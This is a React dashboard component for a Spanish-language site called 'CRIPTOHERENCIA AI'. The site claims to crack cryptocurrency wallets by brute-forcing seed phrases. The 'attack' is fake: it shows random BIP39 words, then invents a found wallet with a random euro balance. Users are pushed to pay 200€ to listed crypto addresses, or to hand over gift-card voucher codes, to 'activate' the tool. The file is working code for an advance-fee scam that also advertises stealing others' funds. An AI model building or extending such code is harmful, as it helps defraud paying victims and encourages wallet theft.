import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuth } from '../context/AuthContext';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Badge } from '../components/ui/badge';
import { Separator } from '../components/ui/separator';
import { useToast } from '../hooks/use-toast';
import { 
  Menu, 
  X, 
  Play, 
  Wallet, 
  History, 
  CreditCard, 
  LogOut, 
  Shield,
  AlertCircle,
  Copy,
  CheckCircle,
  Target,
  Lock,
  Bitcoin,
  Zap
} from 'lucide-react';
import { bip39Words, getRandomAmount, cryptoIcons, paymentAddresses } from '../components/mock';

const UserDashboard = () => {
  const navigate = useNavigate();
  const { user, logout, updateUser } = useAuth();
  const { toast } = useToast();
  
  const [menuOpen, setMenuOpen] = useState(false);
  const [currentView, setCurrentView] = useState('simulator');
  const [selectedCrypto, setSelectedCrypto] = useState('');
  const [userWallet, setUserWallet] = useState('');
  const [isSimulating, setIsSimulating] = useState(false);
  const [currentWords, setCurrentWords] = useState([]);
  const [foundWallet, setFoundWallet] = useState(null);
  const [showCryptoPayment, setShowCryptoPayment] = useState(false);
  const [showCardPayment, setShowCardPayment] = useState(false);
  const [voucherCode, setVoucherCode] = useState('');
  const [attackInProgress, setAttackInProgress] = useState(false);
  const [searchStatus, setSearchStatus] = useState('idle'); // idle, searching, found
  const [selectedWithdrawCrypto, setSelectedWithdrawCrypto] = useState('');
  const [withdrawWallet, setWithdrawWallet] = useState('');

  // Redirect if not authenticated
  useEffect(() => {
    if (!user) {
      navigate('/login');
      return;
    }
    
    // Redirect admin to admin panel
    if (user.isAdmin) {
      navigate('/admin');
      return;
    }
    
    setUserWallet(user.wallet || '');
  }, [user, navigate]);

  const validateWalletAddress = (address, type) => {
    const patterns = {
      BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,87}$/,
      ETH: /^0x[a-fA-F0-9]{40}$/,
      LTC: /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,87}$/
    };
    
    return patterns[type]?.test(address) || false;
  };

  const getWalletType = (address) => {
    if (validateWalletAddress(address, 'BTC')) return 'BTC';
    if (validateWalletAddress(address, 'ETH')) return 'ETH';
    if (validateWalletAddress(address, 'LTC')) return 'LTC';
    return null;
  };

  const startSimulation = () => {
    if (!selectedCrypto) {
      toast({
        title: "Error",
        description: "Selecciona el tipo de billetera a atacar",
        variant: "destructive"
      });
      return;
    }

    if (!userWallet.trim()) {
      toast({
        title: "Error",
        description: "Introduce tu dirección de wallet de destino",
        variant: "destructive"
      });
      return;
    }

    const walletType = getWalletType(userWallet);
    if (!walletType) {
      toast({
        title: "Dirección Inválida",
        description: "La dirección de wallet no es válida",
        variant: "destructive"
      });
      return;
    }

    if (!user.verified) {
      toast({
        title: "Acceso Restringido",
        description: "Necesitas verificar tu cuenta para usar el simulador",
        variant: "destructive"
      });
      return;
    }

    setAttackInProgress(true);
    setIsSimulating(true);
    setSearchStatus('searching');
    setFoundWallet(null);
    
    // Simular búsqueda de palabras seed
    const interval = setInterval(() => {
      const randomWords = [];
      for (let i = 0; i < 12; i++) {
        randomWords.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
      }
      setCurrentWords(randomWords);
    }, 100);

    // Simular "encontrar" una wallet después de 5-15 segundos
    const findTime = 5000 + Math.random() * 10000;
    setTimeout(() => {
      clearInterval(interval);
      setIsSimulating(false);
      setAttackInProgress(false);
      setSearchStatus('found');
      
      const amount = getRandomAmount();
      
      setFoundWallet({
        type: selectedCrypto,
        amount: amount,
        phrase: currentWords
      });

      // Actualizar balance del usuario
      const newBalance = { ...user.balance };
      newBalance[selectedCrypto] = (newBalance[selectedCrypto] || 0) + amount;
      
      const updatedUser = { ...user, balance: newBalance, wallet: userWallet };
      updateUser(updatedUser);
      
      // Actualizar en localStorage
      const users = JSON.parse(localStorage.getItem('cryptoherencia_users') || '[]');
      const userIndex = users.findIndex(u => u.id === user.id);
      if (userIndex !== -1) {
        users[userIndex] = updatedUser;
        localStorage.setItem('cryptoherencia_users', JSON.stringify(users));
      }

      toast({
        title: "¡Wallet Encontrada!",
        description: `Se han sumado ${amount}€ en tu panel`,
      });
    }, findTime);
  };

  const continueSearching = () => {
    setSearchStatus('idle');
    setFoundWallet(null);
    setCurrentWords([]);
  };

  const withdrawFunds = () => {
    if (!foundWallet) return;
    
    // Simular retiro
    const withdrawal = {
      id: Date.now().toString(),
      date: new Date().toISOString(),
      type: foundWallet.type,
      amount: foundWallet.amount,
      wallet: userWallet,
      status: 'Retirado'
    };

    // Guardar en historial
    const history = JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
    history.unshift(withdrawal);
    localStorage.setItem(`history_${user.id}`, JSON.stringify(history));

    setFoundWallet(null);
    toast({
      title: "Retiro Procesado",
      description: `${foundWallet.amount}€ enviados a tu wallet`,
    });
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copiado",
      description: "Dirección copiada al portapapeles",
    });
  };

  const submitVoucher = () => {
    if (!voucherCode.trim()) {
      toast({
        title: "Error",
        description: "Introduce un código de voucher válido",
        variant: "destructive"
      });
      return;
    }

    // Simular envío al admin
    const vouchers = JSON.parse(localStorage.getItem('cryptovouchers') || '[]');
    const newVoucher = {
      id: Date.now().toString(),
      userEmail: user.email,
      code: voucherCode,
      status: 'pendiente',
      date: new Date().toISOString()
    };
    vouchers.push(newVoucher);
    localStorage.setItem('cryptovouchers', JSON.stringify(vouchers));

    setVoucherCode('');
    toast({
      title: "Código Enviado",
      description: "Tu código está siendo verificado por el administrador",
    });
  };

  const getHistory = () => {
    return JSON.parse(localStorage.getItem(`history_${user.id}`) || '[]');
  };

  const getTotalBalance = () => {
    if (!user.balance) return 0;
    return Object.values(user.balance).reduce((sum, value) => sum + value, 0);
  };

  if (!user) return null;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 text-green-400 font-mono">
      {/* Subtle Matrix background */}
      <div className="absolute inset-0 opacity-3 pointer-events-none overflow-hidden">
        {[...Array(10)].map((_, i) => (
          <div
            key={i}
            className="absolute animate-pulse text-green-500 text-xs"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 3}s`,
              animationDuration: `${2 + Math.random() * 3}s`
            }}
          >
            {Math.random() > 0.5 ? '1' : '0'}
          </div>
        ))}
      </div>

      <div className="relative z-10">
        {/* Header */}
        <header className="bg-slate-900/80 backdrop-blur border-b border-green-500/30 p-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <h1 className="text-xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-blue-400 font-mono">
                &gt; CRIPTOHERENCIA AI
              </h1>
            </div>
            
            <div className="flex items-center space-x-4">
              <div className="text-right">
                <div className="text-xs text-slate-400 font-mono">&gt; SALDO DISPONIBLE:</div>
                <div className="text-lg font-bold text-green-400 font-mono">
                  €{getTotalBalance()}
                </div>
              </div>
              
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setMenuOpen(!menuOpen)}
                className="text-green-400 hover:text-green-300 font-mono"
              >
                {menuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
              </Button>
            </div>
          </div>
        </header>

        <div className="flex">
          {/* Sidebar Menu */}
          {menuOpen && (
            <div className="absolute right-0 top-16 bg-slate-900/95 backdrop-blur border border-green-500/50 rounded-lg shadow-2xl shadow-green-500/20 overflow-hidden min-w-[200px] z-50">
              <div className="p-2">
                <Button
                  variant={currentView === 'simulator' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('simulator'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Target className="h-4 w-4 mr-2" />
                  &gt; ATACAR
                </Button>
                <Button
                  variant={currentView === 'history' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('history'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <History className="h-4 w-4 mr-2" />
                  &gt; HISTORIAL
                </Button>
                <Button
                  variant={currentView === 'withdraw' ? 'default' : 'ghost'}
                  onClick={() => {setCurrentView('withdraw'); setMenuOpen(false);}}
                  className="w-full justify-start text-green-400 font-mono text-sm mb-1 hover:bg-green-500/20"
                >
                  <Wallet className="h-4 w-4 mr-2" />
                  &gt; RETIRAR
                </Button>
                <Separator className="my-2 bg-green-500/30" />
                <Button
                  variant="ghost"
                  onClick={() => {logout(); navigate('/');}}
                  className="w-full justify-start text-red-400 hover:text-red-300 font-mono text-sm hover:bg-red-500/20"
                >
                  <LogOut className="h-4 w-4 mr-2" />
                  &gt; CERRAR SESION
                </Button>
              </div>
            </div>
          )}

          {/* Main Content */}
          <div className="flex-1 p-6 relative">
            {/* Account Status Alert */}
            {!user.approved && (
              <Card className="bg-yellow-900/50 border-yellow-400/50 mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <AlertCircle className="h-5 w-5 text-yellow-400" />
                    <div>
                      <h3 className="font-bold text-yellow-400 font-mono">&gt; CUENTA PENDIENTE</h3>
                      <p className="text-sm text-yellow-200 font-mono">Tu cuenta está pendiente de verificación por el administrador.</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {user.approved && !user.verified && (
              <Card className="bg-blue-900/50 border-blue-400/50 mb-6">
                <CardContent className="p-4">
                  <div className="flex items-center space-x-2">
                    <Shield className="h-5 w-5 text-blue-400" />
                    <div>
                      <h3 className="font-bold text-blue-400 font-mono">&gt; VERIFICACION REQUERIDA</h3>
                      <p className="text-sm text-blue-200 font-mono">Para usar el simulador, necesitas verificar tu cuenta mediante pago.</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Activate Program Section - Only for approved but not verified users */}
            {user.approved && !user.verified && (
              <Card className="bg-slate-900/80 border-green-400/50 mb-6">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; ACTIVAR EL PROGRAMA</CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <Button 
                      onClick={() => setShowCryptoPayment(true)}
                      className="bg-gradient-to-r from-green-600 to-green-700 hover:from-green-500 hover:to-green-600 text-black font-mono font-bold py-3"
                    >
                      Comprar con CriptoMonedas
                    </Button>
                    <Button 
                      onClick={() => setShowCardPayment(true)}
                      variant="outline"
                      className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black font-mono font-bold py-3"
                    >
                      Comprar con TARJETA
                    </Button>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Crypto Payment Modal */}
            {showCryptoPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                  <div className="p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                        <Wallet className="h-5 w-5 mr-2 text-gray-700" />
                        Pago con Criptomonedas
                      </h2>
                      <Button
                        onClick={() => setShowCryptoPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-6">
                    <p className="text-gray-600 mb-6 text-sm">
                      Envía exactamente 200€ en cualquiera de estas criptomonedas a la dirección correspondiente:
                    </p>
                    
                    <div className="space-y-4">
                      {Object.entries(paymentAddresses).map(([crypto, address]) => (
                        <div key={crypto} className="border border-gray-200 rounded-lg p-4 hover:border-gray-300 transition-colors">
                          <Label className="text-gray-700 font-medium capitalize mb-2 block">{crypto}:</Label>
                          <div className="flex items-center space-x-2">
                            <Input
                              value={address}
                              readOnly
                              className="bg-gray-50 border-gray-200 text-gray-800 text-sm font-mono"
                            />
                            <Button
                              onClick={() => copyToClipboard(address)}
                              size="sm"
                              variant="outline"
                              className="border-gray-300 text-gray-600 hover:bg-gray-100 flex-shrink-0"
                            >
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                    
                    <div className="bg-blue-50 border border-blue-200 p-4 rounded-lg mt-6">
                      <p className="text-blue-800 text-sm">
                        <strong>Importante:</strong> Una vez enviado el pago, tu cuenta será verificada automáticamente en un plazo de 24 horas.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Card Payment Modal */}
            {showCardPayment && (
              <div className="fixed inset-0 bg-black/50 backdrop-blur flex items-center justify-center z-50 p-4">
                <div className="bg-white rounded-lg shadow-2xl max-w-md w-full">
                  <div className="p-6 border-b border-gray-200">
                    <div className="flex items-center justify-between">
                      <h2 className="text-xl font-semibold text-gray-900 flex items-center">
                        <CreditCard className="h-5 w-5 mr-2 text-gray-700" />
                        Pago con Tarjeta
                      </h2>
                      <Button
                        onClick={() => setShowCardPayment(false)}
                        size="sm"
                        variant="outline"
                        className="border-gray-300 text-gray-500 hover:bg-gray-100"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                  
                  <div className="p-6">
                    <p className="text-gray-600 mb-4 text-sm">
                      Para realizar la compra de forma sencilla pagando con <strong>TARJETA</strong> debes comprar una CryptoVoucher (TARJETA REGALO 200€) y canjear el código que te darán aquí:
                    </p>
                    
                    <div className="space-y-4">
                      <div className="space-y-2">
                        <Label className="text-gray-700 font-medium">Código del Voucher:</Label>
                        <Input
                          value={voucherCode}
                          onChange={(e) => setVoucherCode(e.target.value)}
                          placeholder="Introduce el código aquí"
                          className="bg-gray-50 border-gray-200 text-gray-800"
                        />
                      </div>
                      
                      <Button
                        onClick={submitVoucher}
                        className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium"
                        disabled={!voucherCode.trim()}
                      >
                        Canjear Código
                      </Button>
                    </div>
                    
                    <div className="bg-yellow-50 border border-yellow-200 p-4 rounded-lg mt-4">
                      <p className="text-yellow-800 text-sm">
                        <strong>Nota:</strong> Una vez enviado el código, será revisado por un administrador para verificar tu cuenta.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* Main Content Views */}
            {currentView === 'simulator' && (
              <div className="space-y-6">
                {/* Crypto Selection */}
                <Card className="bg-slate-900/80 border-green-400/50">
                  <CardHeader>
                    <CardTitle className="text-green-400 font-mono text-sm">&gt; SELECCIONAR OBJETIVO</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <div>
                      <Label className="text-blue-400 font-mono text-xs">&gt; TIPO BILLETERA:</Label>
                      <div className="grid grid-cols-3 gap-4 mt-2">
                        {['BTC', 'ETH', 'LTC'].map((crypto) => (
                          <Button
                            key={crypto}
                            variant={selectedCrypto === crypto ? 'default' : 'outline'}
                            onClick={() => setSelectedCrypto(crypto)}
                            className={`${
                              selectedCrypto === crypto 
                                ? 'bg-green-600 text-black' 
                                : 'border-green-400 text-green-400 hover:bg-green-400 hover:text-black'
                            } font-mono text-sm`}
                          >
                            <Bitcoin className="h-4 w-4 mr-2" />
                            {crypto}
                          </Button>
                        ))}
                      </div>
                    </div>
                    
                    <div>
                      <Label className="text-blue-400 font-mono text-xs">&gt; TU WALLET DESTINO:</Label>
                      <Input
                        value={userWallet}
                        onChange={(e) => setUserWallet(e.target.value)}
                        placeholder="Dirección donde recibir los fondos"
                        className="bg-slate-800 border-green-500/30 text-green-300 mt-2 font-mono"
                      />
                      <p className="text-xs text-slate-400 mt-1 font-mono">
                        &gt; Los fondos encontrados se enviarán aquí
                      </p>
                    </div>
                  </CardContent>
                </Card>

                {/* Start Attack Button */}
                <div className="text-center">
                  <Button
                    onClick={() => {
                      if (!user.verified) {
                        toast({
                          title: "Error de Acceso",
                          description: "Debes comprar el programa primero para empezar a atacar y ganar dinero",
                          variant: "destructive"
                        });
                        return;
                      }
                      startSimulation();
                    }}
                    disabled={!selectedCrypto || !userWallet.trim() || attackInProgress}
                    className="bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-mono font-bold text-xl px-12 py-4 uppercase tracking-wider"
                  >
                    &gt; EMPEZAR ATAQUE
                  </Button>
                </div>

                {/* Attack System */}
                <Card className="bg-slate-900/80 border-green-400/50">
                  <CardHeader>
                    <CardTitle className="text-green-400 font-mono text-sm">&gt; ATACAR BILLETERAS</CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-6">
                    {!user.verified ? (
                      <div className="text-center p-8 bg-slate-800 rounded border border-yellow-400/50 relative">
                        <Lock className="h-16 w-16 text-yellow-400 mx-auto mb-4" />
                        <h3 className="text-xl font-bold text-yellow-400 mb-2 font-mono">&gt; ACCESO BLOQUEADO</h3>
                        <p className="text-slate-300 font-mono text-sm">
                          Para acceder al simulador de ataque, necesitas verificar tu cuenta mediante pago.
                        </p>
                      </div>
                    ) : (
                      <>
                        {/* Attack Progress */}
                        {(isSimulating || currentWords.length > 0) && (
                          <div className="bg-black border border-green-400/50 rounded p-4">
                            <div className="text-center mb-4">
                              <h3 className="text-green-400 font-bold font-mono text-sm">
                                {isSimulating ? '&gt; ATACANDO FRASES SEMILLA...' : '&gt; ÚLTIMA BÚSQUEDA'}
                              </h3>
                              {isSimulating && (
                                <div className="text-xs text-blue-400 font-mono mt-2">
                                  &gt; Tipo: {selectedCrypto} | Velocidad: {Math.floor(Math.random() * 5000 + 1000)}/seg
                                </div>
                              )}
                            </div>
                            
                            <div className="grid grid-cols-3 md:grid-cols-4 gap-2 text-xs">
                              {currentWords.map((word, index) => (
                                <div
                                  key={index}
                                  className={`p-2 rounded border text-center font-mono ${
                                    isSimulating 
                                      ? 'border-yellow-400 text-yellow-400 animate-pulse' 
                                      : 'border-green-400 text-green-400'
                                  }`}
                                >
                                  [{String(index + 1).padStart(2, '0')}] {word}
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Found Wallet */}
                        {foundWallet && (
                          <Card className="bg-green-900/50 border-green-400">
                            <CardContent className="p-6 text-center">
                              <CheckCircle className="h-16 w-16 text-green-400 mx-auto mb-4 animate-pulse" />
                              <h3 className="text-2xl font-bold text-green-400 mb-2 font-mono">
                                &gt; WALLET ENCONTRADA!
                              </h3>
                              <p className="text-xl text-white mb-4 font-mono">
                                {cryptoIcons[foundWallet.type]} €{foundWallet.amount} en {foundWallet.type}
                              </p>
                              <div className="space-x-4">
                                <Button
                                  onClick={withdrawFunds}
                                  className="bg-green-500 hover:bg-green-600 text-black font-bold font-mono"
                                >
                                  &gt; RETIRAR FONDOS
                                </Button>
                                <Button
                                  onClick={() => {setFoundWallet(null); startSimulation();}}
                                  variant="outline"
                                  className="border-green-400 text-green-400 hover:bg-green-400 hover:text-black font-mono"
                                >
                                  &gt; CONTINUAR ATACANDO
                                </Button>
                              </div>
                            </CardContent>
                          </Card>
                        )}
                      </>
                    )}
                  </CardContent>
                </Card>
              </div>
            )}

            {currentView === 'history' && (
              <Card className="bg-slate-900/80 border-green-400/50">
                <CardHeader>
                  <CardTitle className="text-green-400 font-mono text-sm">&gt; HISTORIAL RETIROS</CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="space-y-4">
                    {getHistory().length === 0 ? (
                      <div className="text-center py-8 text-slate-400">
                        <History className="h-16 w-16 mx-auto mb-4 opacity-50" />
                        <p className="font-mono">&gt; SIN RETIROS REGISTRADOS</p>
                      </div>
                    ) : (
                      getHistory().map((item) => (
                        <div key={item.id} className="flex items-center justify-between p-4 bg-slate-800 rounded border border-slate-700">
                          <div>
                            <div className="text-green-400 font-bold font-mono">
                              {cryptoIcons[item.type]} €{item.amount} {item.type}
                            </div>
                            <div className="text-sm text-slate-400 font-mono">
                              {new Date(item.date).toLocaleDateString('es-ES')}
                            </div>
                            <div className="text-xs text-blue-400 font-mono break-all">
                              &gt; {item.wallet}
                            </div>
                          </div>
                          <Badge variant="outline" className="border-green-400 text-green-400 font-mono">
                            {item.status}
                          </Badge>
                        </div>
                      ))
                    )}
                  </div>
                </CardContent>
              </Card>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default UserDashboard;